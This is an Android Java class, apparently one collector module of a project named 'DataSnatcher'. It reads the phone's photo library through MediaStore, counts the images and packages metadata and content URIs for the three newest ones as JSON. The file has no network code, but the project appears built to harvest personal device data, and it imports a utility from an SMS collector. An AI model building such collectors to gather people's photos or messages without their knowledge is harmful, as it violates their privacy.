package com.example.DataSnatcher.collector.DCIM;

import android.Manifest;
import android.content.ContentUris;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.DataSnatcher.collector.IInfoCollector;
import com.example.DataSnatcher.collector.SMS.TimeUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

@RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
public class DCIMCollector implements IInfoCollector {

    private static final String TAG = "DCIMCollector";
    private final Context context;

    // 所需权限
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_MEDIA_IMAGES
    };

    public DCIMCollector(Context context) {
        if (context == null) {
            throw new IllegalArgumentException("Context 不能为 null");
        }
        this.context = context.getApplicationContext();
    }


    @Override
    public String getCategory() {
        return "DCIMInfo";
    }

    @Override
    public JSONObject collect() {
        JSONObject photoInfoJson = new JSONObject();
        JSONArray photoList = new JSONArray();

        // 图片库 URI
        Uri imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        // 查询字段
        String[] projection = new String[]{
                MediaStore.Images.Media._ID,          // 必须要 ID，用来构建 ContentUri
                MediaStore.Images.Media.DISPLAY_NAME, // 图片名字
                MediaStore.Images.Media.SIZE,         // 文件大小
                MediaStore.Images.Media.DATE_ADDED,   // 添加时间
                MediaStore.Images.Media.WIDTH,        // 宽
                MediaStore.Images.Media.HEIGHT        // 高
        };

        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = context.getContentResolver().query(
                imageUri,
                projection,
                null,
                null,
                sortOrder
        )) {
            int cnt = 0;
            if (cursor != null && cursor.moveToFirst()) {

                do {
                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
                    long dateAddedSec = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED));
                    int width = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH));
                    int height = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT));
                    if(cnt<3){
                        // 用 ID 生成 Content Uri
                        Uri contentUri = ContentUris.withAppendedId(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                id
                        );

                        JSONObject photoJson = new JSONObject();
                        photoJson.put("name", name);
                        photoJson.put("uri", contentUri.toString());  // 不是 file path，是 content://
                        photoJson.put("size", size);
                        photoJson.put("width", width);
                        photoJson.put("height", height);

                        // 转为可读时间
                        String formattedDate = TimeUtils.formatDate(dateAddedSec * 1000);
                        photoJson.put("date_added", formattedDate);

                        photoList.put(photoJson);
                    }
                    cnt++;
                } while (cursor.moveToNext());
            }
            photoInfoJson.put("photo_count", cnt);
            photoInfoJson.put("photo_list", photoList);
        } catch (Exception e) {
            try {
                photoInfoJson.put("error", "读取相册失败: " + e.getMessage());
                photoInfoJson.put("photo_count", 0);
                photoInfoJson.put("photo_list", new JSONArray());
            } catch (JSONException jsonException) {
                Log.e(TAG, "构造相册错误 JSON 时失败", jsonException);
            }
        }

        return photoInfoJson;
    }


}
